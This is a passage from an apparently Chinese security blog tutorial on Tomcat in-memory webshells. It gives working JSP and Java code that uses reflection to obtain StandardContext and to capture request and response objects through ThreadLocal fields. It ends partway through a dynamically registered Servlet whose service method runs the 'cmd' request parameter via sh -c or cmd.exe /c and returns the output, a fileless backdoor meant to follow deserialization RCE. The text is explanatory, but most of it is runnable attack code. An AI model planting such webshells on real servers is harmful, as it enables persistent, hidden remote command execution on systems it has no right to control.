因此这里获取resources属性需要在其父类去找，getDeclaredField()无法获取父类的属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">resources</span> <span class="operator">=</span> contextClassLoader.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">    resources.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) resources.get(contextClassLoader);</span><br><span class="line"></span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="方式三：从ThreadLocal中获取"><a href="#方式三：从ThreadLocal中获取" class="headerlink" title="方式三：从ThreadLocal中获取"></a>方式三：从ThreadLocal中获取</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><blockquote><p>由于在 <code>jsp</code> 中内置了 <code>request</code> 和 <code>response</code> 所以我们能直接获取到 ，于是我们可以直接在 <code>response</code> 写我们的回显内容， 但是当我们结合反序列化打的时候，由于注入的是字节码所以我们需要通过一些手段获取到 <code>request</code> 和 <code>response</code> 这样我们才能进行回显。（除非我们能通过反序列化 <code>RCE</code> 直接上传 <code>jsp</code> 的 <code>shell</code> 页面到服务器的网页目录，但是这就不叫内存马了，我们不能落地文件。）</p></blockquote><p><code>kingkk</code> 师傅的思路是寻找一个静态的可以存储 <code>request</code> 和 <code>response</code> 的变量，因为如果不是静态的话，那么我们还需要获取到对应的实例，最终 <code>kingkk</code> 师傅找到了如下位置：</p><p>这里  <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 都是静态变量。</p><p><img src="/imgs/1676393214391.png"></p><p>在 <code>ApplicationFilterChain#internalDoFilter</code>中，发现在 <code>WRAP_SAME_OBJECT</code> 为 <code>true</code> ，就会调用 <code>set</code> 函数将我们的 <code>request</code> 和 <code>response</code> 存放进去，那么 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 是在哪里初始化的呢？</p><p><img src="/imgs/1676393383283.png"></p><p>我们看到该文件的最后，发现在静态代码块处会进行一次设置，由于静态代码片段是优先执行的，而且最开始 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code> 默认为 <code>False</code> ，所以 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 一开始默认为 <code>null</code> 。</p><p><img src="/imgs/1676393292111.png"></p><p>所以我们需要利用反射来修改 <code>WRAP_SAME_OBJECT</code> 为 <code>true</code> ，同时初始化 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> ，大致代码如下：</p><p><img src="/imgs/Pasted%20image%2020230215005058.png"></p><p>那么这样我们的 <code>request</code> 和 <code>response</code> 就被存放在其中了。</p><p>这样当我们第二次访问的时候将 <code>response</code> 从 <code>lastServicedResponse</code> 中取出来，然后将我们命令执行的结果直接写在 <code>response</code> 里面就可以了。</p><p>所以这里的大致思路如下：</p><ol><li>第一次访问利用反射修改特定参数，从而将 <code>request</code> 和 <code>response</code> 存储到 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 中。</li><li>第二次访问将我们需要的 <code>request</code> 和 <code>response</code> 取出，从而将结果写入 <code>response</code> 中从而达到回显目的。</li></ol><p><img src="/imgs/1676394901744.png"></p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>再正向分析一遍流程就会更加清晰了。</p><p>由于 <code>WRAP_SAME_OBJECT</code> 默认为 <code>False</code> ，所以在启动阶段 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 为 <code>null</code> 。</p><p><img src="/imgs/Pasted%20image%2020230215012648.png"></p><p>第一次访问 <code>/echo</code> 后 ，此时还没有解析我们的java代码所以 <code>WRAP_SAME_OBJECT</code>为 <code>False</code> 。</p><p><img src="/imgs/Pasted%20image%2020230215012721.png"></p><p>由于 <code>Globals.IS_SECURITY_ENABLED</code> 默认为 <code>False</code> 所以就会进入 <code>else</code>，在 <code>else</code> 中 <code>this.servlet.service</code> 会来到我们自己的代码处理。</p><p><img src="/imgs/Pasted%20image%2020230215012753.png"></p><p>来到我们自己的代码处</p><p><img src="/imgs/Pasted%20image%2020230215012810.png"></p><p>由于默认为 <code>false</code> 且 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 都为 <code>null</code>，所以会进入我们的 <code>if</code> 判断，在判断中会调用反射来对值进行修改。<br><img src="/imgs/Pasted%20image%2020230215012843.png"></p><p>设置完之后进到 <code>finally</code>，在 <code>finally</code> 中又将 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 设为了 <code>null</code> 。</p><p>ps：这里的 <code>null</code> 和 静态代码片段中的 <code>null</code> 不同，这里是对象。</p><p>![<a href="imgs/Pasted%20image%2020230215012920.png"></a></p><p>至此第一次访问就结束了，接下来进行第二次也就是我们的命令执行环境</p><p>由于第一次中我们利用反射修改了 <code>WRAP_SAME_OBJECT</code> 为 <code>true</code>，所以这里会调用 <code>set</code> 将 <code>request</code> 和 <code>response</code> 进行存入。</p><p><img src="/imgs/Pasted%20image%2020230215012956.png"></p><p>然后进入下方 <code>else</code> 触发我们自己的代码<br><img src="/imgs/Pasted%20image%2020230215013007.png"></p><p>在我们的代码中，已正常获取到了我们的 <code>request</code> 和 <code>response</code> ，同时我们的 <code>cmd</code> 也不为 <code>null</code>，所以就来到了执行命令处进行了命令执行，并且将结果直接在 <code>response</code> 中写入。</p><p><img src="/imgs/Pasted%20image%2020230215013049.png"></p><p>最终在前端页面获得命令输出结果。</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Modifier&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">// 1.让需要的变量先可修改</span></span><br><span class="line">  <span class="type">Class</span> <span class="variable">applicationDispatcher</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> applicationDispatcher.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">  WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="comment">// 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>).getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">  f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  f0.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">  <span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">  lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  f0.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">  f0.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取lastServicedRequest,lastServicedResponse,刚开始这里由于WRAP_SAME_OBJECT_FIELD为false，因此下面两个变量都是null</span></span><br><span class="line">  ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(applicationFilterChain);</span><br><span class="line">  ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(applicationFilterChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lastServicedRequest == <span class="literal">null</span>)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;没有获取到request&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(lastServicedRequest.get());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;没有获取到response&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(lastServicedResponse.get());</span><br><span class="line">    <span class="comment">// 在这里可以执行命令，并回显命令结果</span></span><br><span class="line">    lastServicedResponse.get().getWriter().write(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher, <span class="literal">true</span>);</span><br><span class="line">  lastServicedRequestField.set(applicationFilterChain, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">  lastServicedResponseField.set(applicationFilterChain, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694367069990.png"></p><h3 id="方式四：通过MBean获取"><a href="#方式四：通过MBean获取" class="headerlink" title="方式四：通过MBean获取"></a>方式四：通过MBean获取</h3><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>通过 <code>MBean</code> 获取。（如果是 <code>jsp</code> 那就可以直接用。如果在 <code>SpringBoot</code> 中用，那前提是在 <code>SpringBoot</code> 中开启 <code>Tomcat</code> 的 <code>mbeanregistry</code> 功能，默认是关闭的）</p><ul><li><code>application.yml</code></li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">tomcat:</span></span><br><span class="line">    <span class="attr">mbeanregistry:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在 <code>SpringBoot</code> 中，如果不开启 <code>mbeanregistry</code> ，就会像下面获取不到 <code>mbeanServer</code> 。</p><p><img src="/imgs/1694370246853.png"></p><p>参考 <code>https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</code></p><ul><li><code>jsp</code> 的获取方式流程</li></ul><p><img src="/imgs/1694370100935.png"></p><ul><li><code>SpringBoot</code> 的获取方式流程</li></ul><p><img src="/imgs/1694284472023.png"></p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><p>注意下面代码中，要根据环境来选择 <code>domainTb.get(&quot;xxx&quot;)</code> 中的 <code>xxx</code> 填什么。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.authenticator.NonLoginAuthenticator&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.management.MBeanServer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.modeler.Registry&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">MBeanServer</span> <span class="variable">mBeanServer</span> <span class="operator">=</span> Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取mbsInterceptor</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Object</span> <span class="variable">mbsInterceptor</span> <span class="operator">=</span> field.get(mBeanServer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取repository</span></span><br><span class="line">  field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Object</span> <span class="variable">repository</span> <span class="operator">=</span> field.get(mbsInterceptor);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取domainTb</span></span><br><span class="line">  field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  HashMap&lt;String, Map&gt; domainTb = (HashMap&lt;String,Map&gt;)field.get(repository);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在jsp中要用domainTb.get(&quot;Catalina&quot;)，在SpringBoot中要用domainTb.get(&quot;Tomcat&quot;)</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">keyNonLoginAuthenticator</span> <span class="operator">=</span> <span class="string">&quot;context=/,host=localhost,name=NonLoginAuthenticator,type=Valve&quot;</span>;</span><br><span class="line">  <span class="type">NamedObject</span> <span class="variable">namedObject</span> <span class="operator">=</span> (NamedObject) domainTb.get(<span class="string">&quot;Catalina&quot;</span>).get(keyNonLoginAuthenticator);</span><br><span class="line"><span class="comment">//  NamedObject namedObject = (NamedObject) domainTb.get(&quot;Tomcat&quot;).get(keyNonLoginAuthenticator);</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取object</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">object</span> <span class="operator">=</span> namedObject.getClass().getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">  object.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">BaseModelMBean</span> <span class="variable">baseModelMBean</span> <span class="operator">=</span> (BaseModelMBean) object.get(namedObject);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取resource</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">resource</span> <span class="operator">=</span> baseModelMBean.getClass().getDeclaredField(<span class="string">&quot;resource&quot;</span>);</span><br><span class="line">  resource.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">NonLoginAuthenticator</span> <span class="variable">nonLoginAuthenticator</span> <span class="operator">=</span> (NonLoginAuthenticator) resource.get(baseModelMBean);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取context（注意这里的context在nonLoginAuthenticator的父类里面，而getDeclaredField是不能获取父类的属性的，因此这里需要getSuperClass()）</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> nonLoginAuthenticator.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context.get(nonLoginAuthenticator);</span><br><span class="line"></span><br><span class="line">  System.out.println(standardContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="方式五：通过RequestContextHolder获取"><a href="#方式五：通过RequestContextHolder获取" class="headerlink" title="方式五：通过RequestContextHolder获取"></a>方式五：通过RequestContextHolder获取</h3><blockquote><p>注意：这种方式只适用于 <code>Spring</code> 框架中。</p></blockquote><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>在 <code>Spring</code> 中，可以通过 <code>RequestContextHolder. currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0)</code> 静态方法拿到 <code>Spring</code> 的全局 <code>context</code> ，而且这个 <code>Spring</code> 的 <code>context</code> 中封装了 <code>Tomcat</code> 的 <code>StandardContext</code> （在 <code>SpringBoot</code> 中其实是其子类 <code>TomcatEmbeddedContext</code> ）。</p><h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先获取Spring的context</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.</span><br><span class="line">currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;springContext = &quot;</span> + context);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 再获取Spring的context中封装的Tomcat的StandardContext</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> context.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 注意当前环境中有两个ApplicationContext类，一个Spring的，一个Tomcat的，这里要用Tomcat(org.apache.catalina.core.ApplicationContext)，不要导错了</span></span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) field.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br></pre></td></tr></table></figure><h2 id="Servlet组件的存储位置"><a href="#Servlet组件的存储位置" class="headerlink" title="Servlet组件的存储位置"></a>Servlet组件的存储位置</h2><blockquote><p>通过前面文章的分析，我们现在已经可以拿到 <code>Tomcat</code> 的 <code>web</code> 应用的 <code>StandardContext</code> 这个全局控制管理关键类了。为了后面我们在程序中动态地注册 <code>Servlet</code> 组件，我们先要知道 <code>Servlet</code> 的组件存放在哪里，这样我们才能知道如何通过 <code>StandardContext</code> 来动态注册 <code>Servlet</code> 组件。这里我们在下面介绍的是 <code>Tomcat</code> 服务器中的 <code>Servlet</code> 实现，重点研究 <code>Tomcat</code> 中的内存马。不同框架的 <code>Servlet</code> 实现不同，因此其内存马的实现也不同。</p></blockquote><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>在上面 <code>Tomcat</code> 的容器组件中介绍到了，一个 <code>Servlet</code> 在 <code>Tomcat</code> 对应一个 <code>Wrapper</code> 。因此注册一个 <code>Servlet</code> 应该肯定关键在于分析 <code>Wrapper</code> 的使用。</p><h4 id="Servlet接口"><a href="#Servlet接口" class="headerlink" title="Servlet接口"></a>Servlet接口</h4><p><code>Servlet</code> 是处理 <code>http</code> 请求的一个组件，其核心处理 <code>http</code> 请求的位置在其 <code>service()</code> 函数中，因此动态注册一个 <code>Servlet</code> 就是要定义一个 <code>Servlet</code> 接口的实现类，定义其 <code>service</code> 方法。</p><p><img src="/imgs/Pasted%20image%2020230911023603.png"></p><h4 id="Wrapper接口"><a href="#Wrapper接口" class="headerlink" title="Wrapper接口"></a>Wrapper接口</h4><p>通过观察 <code>Wrapper</code> 接口中定义的方法，我们可以很容易得知这个接口的功能应该就是用于管理我们定义的 <code>Servlet</code> ，<code>Wrapper</code> 中 <strong>封装</strong> 了 <code>Servlet</code> 。</p><p>它们的功能简单点来说，<code>Servlet</code> 是关于具体如何处理 <code>http</code> 请求的；<code>Wrapper</code> 是关于处理 <code>Servlet</code> 状态，获取 <code>Servlet</code> 状态的。</p><p>打个比方，<code>Servlet</code> 就像一个运行的机器，我们要告诉它怎么运行；<code>Wrapper</code> 就像一个机器背后的监控运维程序，用于获取或设置机器状态；<code>StandardContext</code> 就像工厂的老板，管理全部，由老板（ <code>StandardContext</code> ）决定运维（ <code>Wrapper</code> ）来是否开启机器（ <code>Servlet</code> ）。</p><p><img src="/imgs/Pasted%20image%2020230911024023.png"></p><h4 id="具体如何动态注册Servlet代码"><a href="#具体如何动态注册Servlet代码" class="headerlink" title="具体如何动态注册Servlet代码"></a>具体如何动态注册Servlet代码</h4><p>动态注册 <code>Servlet</code> 比较容易，说了那么多概念，直接给出代码就懂了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> &#123;</span><br><span class="line"><span class="comment">// 在service里面定义我们想在servlet里实现的功能，这里我们就是要注入命令</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">isLinux = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>( in ).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line">out.println(output);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span 